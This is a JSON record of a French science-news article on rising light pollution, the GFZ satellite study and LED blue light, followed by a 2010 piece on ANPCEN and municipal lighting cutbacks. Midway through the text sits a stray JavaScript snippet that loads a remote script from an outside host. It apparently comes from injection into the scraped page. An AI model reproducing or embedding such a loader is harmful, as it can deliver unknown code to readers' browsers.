{"title": "La pollution lumineuse ne cesse d'augmenter", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "27/11/2017", "content": "La lumière artificielle peut avoir des effets néfastes sur notre environnement, surtout la nuit. C'est pour cela qu'il est question de pollution lumineuse. Une publication récente montre que cette pollution s'accroît un peu partout dans le monde. Les étonnantes images de la Terre éclairée par les lumières humaines                       Saisies par le satellite Suomi NPP, de la NOAA et de la Nasa, ces images sont les premières depuis 2012 à montrer la planète entière de nuit. Cette vidéo, qui montre la Terre comme si elle n'était jamais éclairée par le Soleil, dessine une carte étonnamment précise des grandes agglomérations du monde. Les zooms montrent l'Europe de l'Ouest, New York, la vallée du Nil…                                       En octobre dernier, Nicolas Hulot, ministre de la transition écologique et solidaire, annonçait la prochaine mise en œuvre de mesures pour protéger le ciel et l'écosystème  nocturnes  des méfaits de la  pollution lumineuse . Il faut dire qu'il y a urgence : la surface du globe artificiellement éclairée la nuit a augmenté de 2,2 % chaque année entre 2012 et 2016. Et l'intensité de l'éclairage artificiel a progressé de 1,8 % par an sur la même période. Ce sont les conclusions d'une étude menée par des chercheurs du  centre GFZ de recherche géophysique de Potsdam  (Allemagne) à partir d' images satellite . Rappelons que si l'on parle de  pollution lumineuse , c'est que, la nuit notamment, la  lumière  artificielle peut avoir des  effets néfastes  sur notre environnement. Elle en a aussi sur notre santé. Ainsi, elle peut perturber notre  cycle circadien  et notre  horloge biologique . Elle peut également perturber la dormance des végétaux. Sur cette photo de Milan, prise la nuit depuis la Station spatiale internationale (ISS), les quartiers éclairés par des LED (au centre) sont au moins aussi lumineux que ceux restant éclairés par de la lumière plus classique (en périphérie). Le ratio de lumière bleue apparaît bien supérieur au centre, ce qui laisse craindre des impacts accrus sur la santé et l’environnement. © Nasa, ESA                               La technologie LED mise en cause L'inquiétude est d'autant plus grande que les résultats obtenus par les chercheurs allemands pourraient être sous-estimés. Les nouveaux  éclairages LED  émettent en effet beaucoup de  lumière bleue . Or, l'instrument utilisé pour cette étude est incapable de détecter cette lumière. Si certaines villes semblent aujourd'hui moins lumineuses sur les images satellite, elles l'apparaissent tout autant, voire plus, sur de simples photos prises depuis la Station spatiale internationale (voir ci-dessus).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En conclusion, les chercheurs du centre GFZ pointent un effet pervers de la technologie LED. L'un d'entre eux, Christophe Kyba, résume ainsi :  « Il y a un bon potentiel pour une véritable révolution de l'éclairage permettant à la fois d'économiser de l' énergie  et de réduire la pollution lumineuse, mais seulement si on ne consacre pas les économies réalisées à créer encore plus de lumière ». Pour en savoir plus Préservation du ciel nocturne : des avancées prometteuses En cette Année Mondiale de la  Biodiversité  qui fait suite à l'Année Mondiale de l'Astronomie, la lutte contre la pollution lumineuse commence à porter ses fruits. Petit tour d'horizon des sujets de satisfaction pour les amoureux du ciel étoilé. Article de Jean-Baptiste Feldmann, paru le 12/08/2010 Ces dernières décennies la pollution lumineuse a pris des proportions inquiétantes, comme on peut s'en rendre compte en découvrant les cartes réalisées par l'astronome amateur Frédéric Tapissier, membre de l' Avex . Pour répondre à une forte demande de sécurité, les installations destinées à éclairer lieux publics et voies de circulation se sont multipliées, encouragées par les producteurs d'électricité qui cherchaient à vendre une énergie plus abondante et moins chère la nuit. Depuis quelques années, l' ANPCEN  (Association nationale pour la protection du ciel et de l'environnement nocturnes) va à la rencontre des élus et du public pour montrer les méfaits de cet hyper éclairage. L'excès d'éclairage a des conséquences négatives sur l'Homme (trop de lumière nocturne est à l'origine de  stress , de fatigue et de  troubles du sommeil ) mais également sur la  faune  et la flore (la régression ou la disparition de certaines  espèces  victimes du suréclairage a des conséquences sur toute la  chaîne alimentaire ). En tordant le cou à quelques idées reçues (notamment en  matière  de sécurité) et en montrant les économies que réalisaient les villes qui choisissaient un éclairage raisonné, l'ANPCEN peut aujourd'hui dresser un premier bilan positif : 30 communes françaises ont signé la charte de l'Association pour la protection du ciel et de l'environnement nocturnes, et de nombreuses autres sont engagées dans des programmes de modernisation des  luminaires  publics avec une réduction du temps d'éclairage. Le lampadaire « boule », où comment gaspiller 60 % de l'éclairage qui n'est pas dirigé vers le sol ! © A. Le Gué, ANPCEN                               Quand nuit ne rime plus avec insécurité En 2006, l'autoroute A16 dans le nord de la France se retrouve plongée dans le noir définitivement : Etat et Région ne sont pas parvenus à se mettre d'accord pour payer la facture d'électricité. Depuis cette date, la Dirif (Direction des routes d'Île-de-France) constate que le nombre d'accidents et de victimes est en baisse de plus de 30 %, avec aucun tué depuis octobre 2008. Un résultat qui met à mal l' équation   plus de lumière égale plus de sécurité  mais qui est logique : dans l'obscurité les conducteurs roulent moins vite et sont plus vigilants... Forte de ce constat, la Dirif vient d'éteindre 130 kilomètres supplémentaires de tronçons routiers en Île-de-France et va continuer dans ce sens, l'objectif étant d'atteindre une baisse de 40 % de la consommation électrique sur l'ensemble du réseau de la région. De leur côté, les communes qui se sont engagées dans une gestion raisonnée de leur éclairage font toutes le même constat. Qu'ils aient choisi de baisser l'intensité lumineuse des lampadaires, d'en éteindre un sur deux ou de plonger leur commune dans le noir complet entre 3 et 5 heures par nuit, les élus sont unanimes pour reconnaître que ces dispositions n'ont pas diminué la sécurité, bien au contraire. Ils observent moins de cambriolages (les malfaiteurs n'aiment pas le noir), moins de tapage nocturne (les groupes bruyants se disloquent quand les éclairages s'éteignent) et moins d'accidents pour les mêmes raisons que celles évoquées dans le cas de l'A16. Sans compter l'aspect économique : à Joué-lès-Tours par exemple, seconde ville du département d'Indre-et-Loire, l' extinction  des lumières 5 heures par nuit représente une économie annuelle de 150.000 euros, soit 50 % de la dépense électrique totale ! Comme le souligne l'ANPCEN, les projets de réduction de temps d'éclairage ne peuvent se concevoir que si on les accompagne d'une sensibilisation importante des élus et des habitants des communes concernées. Réunions publiques, périodes d'essai sur des secteurs géographiques limités, présentation du bilan et prise en compte des remarques des usagers : comme toujours la réussite de l'opération passe par le dialogue pour faire tomber préjugés et idées reçues. Grâce à son engagement, l'ANPCEN est également à l'origine de l'article 66 du  Grenelle de l'environnement  qui prévoit d'imposer des restrictions en vue de limiter l' émission  de lumières artificielles et la consommation d'énergie qui en découle. Un cadre législatif qui vient en renfort des arguments de bon sens que chacun peut avancer pour mener chez lui la lutte contre la pollution lumineuse... ", "theme": "planete"}